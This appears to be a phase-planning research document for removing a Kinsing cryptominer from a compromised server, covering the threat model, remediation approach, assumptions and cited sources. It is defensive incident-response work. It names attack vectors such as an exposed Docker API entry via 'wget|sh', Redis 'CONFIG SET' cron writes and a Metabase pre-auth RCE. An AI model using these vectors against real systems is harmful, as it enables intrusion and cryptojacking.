> No code test framework applies — this is an infra/ops phase with no `tests/` directory and no `package.json`-driven suite in scope (the deliverable is droplet-side actions + a `24-VERIFICATION` evidence doc, not new modules in this repo). "Validation" here = the verification-evidence commands above, captured as a reproducible read-only sweep mirroring `22-EVIDENCE.md`.

| Property | Value |
|----------|-------|
| Framework | None (infra phase) — evidence-by-command, recorded in `24-VERIFICATION` |
| "Quick run" (per destructive step) | the step's own before/after snapshot (`df -h /`, `docker system df`, `ps`, `crontab -l`) |
| "Full suite" (phase gate) | the full Verification table re-run after R7, plus an off-box `nc` reachability probe + (optional) post-reboot re-check |

**Sampling cadence:**
- **Per destructive step:** capture before/after evidence + confirm the revert path exists.
- **Per workstream merge (malware / reclaim / keys):** re-run that workstream's verification rows.
- **Phase gate (before `/gsd-verify-work`):** entire Verification table green; observation window clean; team notified.

**Wave 0 gaps:** none of code; the only "infrastructure" to stand up is the `/root/24-backup/` evidence directory and the `24-VERIFICATION` doc skeleton — create both before the first destructive step.

## Security Domain

This phase IS a security incident response, so the security framing is central rather than incidental.

### Applicable controls (mapped to STRIDE)

| Threat pattern (this box) | STRIDE | Standard mitigation (P24-appropriate, repo-edit-free) |
|---------------------------|--------|-------------------------------------------------------|
| Exposed Docker daemon API (2375/2376) | Elevation of Privilege / Tampering | Confirm daemon not on TCP; if it is, DO Cloud Firewall deny + daemon socket bind to unix only (host-level `daemon.json`, not compose) |
| Unauthenticated/host-published Redis (RCE via `CONFIG SET`) | Tampering / EoP | Confirm broker is docker-internal only; `requirepass`; firewall-deny 6379 inbound |
| `django runserver` + `DEBUG` exposed publicly | Information Disclosure / EoP | Firewall-deny :8000 from internet (do NOT edit settings/compose — that's a team change → notify) |
| Old Metabase v0.47.1 exposed (known CVEs incl. CVE-2023-38646 pre-auth RCE class) | EoP | Firewall-deny :3000 from internet; flag version upgrade as team notification |
| Cryptominer persistence (cron/systemd/ld.so.preload) | Persistence / Tampering | Enumerate-backup-remove (R0–R4); decloak rootkit; observation window |
| SSH key backdoor / harvested SSH config for lateral movement | EoP / Lateral movement | Audit `authorized_keys` (all users), `~/.ssh/config`, `known_hosts`; D-05 rewrite; rotate if unknown keys found |
| Secret exposure (`.env` with `OXYLABS_*`, `DJANGO_SECRET_KEY`) on compromised host | Information Disclosure | No new secrets on box (D-06); team should rotate `.env` secrets post-remediation; keep "no Oxylabs creds until verified" rule (D-01) |

### Standard incident-response posture applied here
- **Contain before clean:** close the entry vector (firewall) before/while removing payloads, so you are not cleaning into an open door.
- **Assume secret exposure:** a long-running compromise means `.env` secrets and SSH material should be treated as potentially exfiltrated → team rotation recommendation (notification, not a P24 code change).
- **Verify by independent signal:** decloak + reboot + off-box reachability probe are independent confirmations, not just the same `ps` the malware can fool.
- **Preserve forensics:** the R0 backups double as incident evidence for the team notification.

## State of the Art

| Old approach | Current approach | Impact |
|--------------|------------------|--------|
| `kill.sh` per-minute process-kill loop (symptom suppression) | Find + remove persistence + close entry vector + verify-clean window | The audit's `kill.sh` is the anti-pattern; modern guidance (Huntress/Sysdig/Aqua) is root-cause removal, not whack-a-mole. |
| Host `ufw`/`iptables` to block docker-published ports | DO Cloud Firewall (upstream of the NIC) | Docker inserts its own iptables rules that bypass ufw's filter chain; cloud firewall is not bypassable and needs no compose edit. |
| Rebuild-the-box as the only safe cure | In-place removal IS viable when you decloak + enumerate every persistence path + confirm via reboot — vendors still recommend rebuild for *uncertain* cases | Operator chose in-place (D-01); the reboot test + clean window is what makes in-place defensible. Surface rebuild as the fallback if re-infection persists after R2–R4. |

## Assumptions Log

| # | Claim | Section | Risk if wrong |
|---|-------|---------|---------------|
| A1 | The re-spawner persistence is local (cron/systemd/ld.so.preload/container) and enumerable, not solely continuous external re-exploitation | Threat Model / Runbook | If it's purely external re-exploit, removing local persistence won't hold until the firewall closes the vector — mitigated by doing R3 (vector closure) regardless. |
| A2 | The live `hemnet` image is tagged and referenced by the 7 containers, so `image prune` won't remove it | Safe Reclaim | Low — verified by `docker ps -a --format {{.Image}}` at execute-time before pruning. |
| A3 | `kill.log` has no persistent open handle (short-lived cron process), so `rm` frees space after kill.sh retired | Log reclaim | Low — `lsof` check confirms before delete. |
| A4 | Access survives reboot (runbook "by construction") so a confirmation reboot is safe | Runbook R6 | Medium — runbook asserts but never reboot-tested in prod; that's why R6 is operator-gated + a safety session/Console fallback is noted. |
| A5 | Metabase v0.47.1 and django runserver are *candidate* vectors, not confirmed open | Entry Vector | Low — explicitly framed as "diagnose at execute-time", not assumed. |
| A6 | `doctl` may be unauthenticated (token expiry conflict between runbook and memory) | Environment | Low — UI fallback exists; flagged to re-verify. |

## Open Questions (RESOLVED)

> **Resolution status (2026-06-30):** none are open blockers. Q1/Q2 are intentional
> execute-time LIVE-BOX diagnostics that 24-01's read-only sweep is designed to answer and
> 24-02/24-05 branch on (not pre-plan unknowns). Q3 is operator-discretion handled in 24-03
> (D-04). Q4 is resolved YES → folded into D-08/24-05 (the operator owns the repo, so secret
> rotation is executed, not recommended to a team).

1. **(Q1 — execute-time diagnostic, answered by 24-01 R2)** What is in the per-user cron spools and is there a systemd `bot` unit?**
   - Known: system crontab holds only `kill.sh`; audit did not enumerate `/var/spool/cron/crontabs/*` or `systemctl list-timers`.
   - Unclear: the actual re-spawner location.
   - Recommendation: make R2 enumeration the first execute-time action; the plan's first task should be a read-only persistence sweep that updates this doc before any removal.

2. **Is any service actually internet-reachable, or is the foothold purely local?**
   - Known: candidates are Docker API / Redis / :8000 / :3000.
   - Unclear: real external exposure (depends on DO firewall + bind interfaces).
   - Recommendation: off-box `nc` probe + `ss -tlnp` decide the branch in the decision tree; close at Cloud Firewall regardless as defense-in-depth.

3. **Does the operator want `scraper_log_export` archived off-box before deletion?**
   - Recommendation: default to confirming with operator (D-04 discretion); cheapest safe path is `scp` to operator workstation or skip archive if the Nov-2025 export logs have no ongoing value.

4. **Should `.env` secrets be rotated by the team post-remediation?**
   - Recommendation: yes — include in the team notification; not a P24 action (no secret changes on box, D-06).

## Sources

### Primary (HIGH confidence)
- Huntress Threat Library — Kinsing (process names `kinsing`/`kdevtmpfsi`, persistence locations, removal phases): https://www.huntress.com/threat-library/malware/kinsing
- Sandfly Security — Log4j Kinsing stealth malware (LD_PRELOAD decloak via `/etc/ld.so.preload`, masqueraded processes, live-host detection): https://sandflysecurity.com/blog/log4j-kinsing-linux-malware-in-the-wild
- Aqua Security — Kinsing container attacks (Docker-API entry `wget|sh`, cron re-download, container-spawn technique): https://www.aquasec.com/blog/threat-alert-kinsing-malware-container-vulnerability/
- DigitalOcean — Cloud Firewalls (network-layer, separate from host ufw, default-deny inbound, configurable via API/CLI without compose edits): https://docs.digitalocean.com/products/networking/firewalls/
- DigitalOcean — `doctl compute firewall` reference: https://docs.digitalocean.com/reference/doctl/reference/compute/firewall/

### Secondary (MEDIUM confidence)
- SecurityWeek — Kinsing deploys crypto-miner in container environments (kinsing monitors/relaunches kdevtmpfsi): https://www.securityweek.com/kinsing-linux-malware-deploys-crypto-miner-container-environments/
- Trend Micro — Exposed Redis abused for RCE / cryptomining (Redis `CONFIG SET` → cron write vector): https://www.trendmicro.com/en_us/research/20/d/exposed-redis-instances-abused-for-remote-code-execution-cryptocurrency-mining.html
- Trend Micro — Kinsing rootkit / LD_PRELOAD analysis (403 on direct fetch; corroborated via Huntress + Sandfly): https://www.trendmicro.com/en_us/research/20/k/analysis-of-kinsing-malwares-use-of-rootkit.html
- LatestHackingNews — Kinsing targeting exposed Docker API ports: https://latesthackingnews.com/2020/04/07/kinsing-malware-actively-targeting-docker-servers-with-exposed-apis-ports/
- Security Scientist — Kinsing Q&A (entry vectors incl. PostgreSQL trust auth, Log4j, ActiveMQ): https://www.securityscientist.net/blog/12-questions-and-answers-about-kinsing/

### Tertiary (LOW confidence — corroborate at execute-time)
- createIT — kdevtmpfsi how-to-kill (only offers the same symptom-suppression loop as `kill.sh`; cited as the anti-pattern, NOT as remediation): https://www.createit.com/blog/kinsing-malware-kdevtmpfsi-how-to-kill/

### Internal evidence (authorizes every action)
- `docs/price-scraper-droplet-audit.md` — keep/kill verdicts, disk/log inventory, malware finding, container list, resource baseline.
- `.planning/phases/22-deep-dive-audit/22-EVIDENCE.md` — raw command evidence §1–§5 (incl. §3 `kill.sh`/crontab, §2 storage/logs).
- `docs/price-scraper-droplet-runbook.md` — SSH access model (`IdentitiesOnly` gotcha), reboot-survives-by-construction, key inventory.
- `.planning/STATE.md` — Phase 23 outcome + 2026-06-30 malware/creds decision (no creds on box until remediated; dead droplet Oxylabs creds 401).

## Metadata

**Confidence breakdown:**
- Malware persistence mechanics + detection (decloak, cron/systemd/ld.so.preload, IOCs): HIGH — multiple independent reputable sources agree.
- Entry vector for THIS box: MEDIUM — must be diagnosed live; research provides checks + decision tree, deliberately does not assume.
- Docker prune / log open-handle / image-reference semantics: HIGH — stable, well-established Linux/Docker behavior.
- DO Cloud Firewall as repo-edit-free vector closure: HIGH — official docs confirm network-layer + CLI/UI management.
- `doctl` auth availability: LOW — conflicting signals; flagged to re-verify.

**Research date:** 2026-06-30
**Valid until:** ~2026-07-30 for malware/Docker mechanics (stable); the live-box state (ports, cron, processes) is only valid at the moment of the execute-time sweep — re-enumerate before acting.
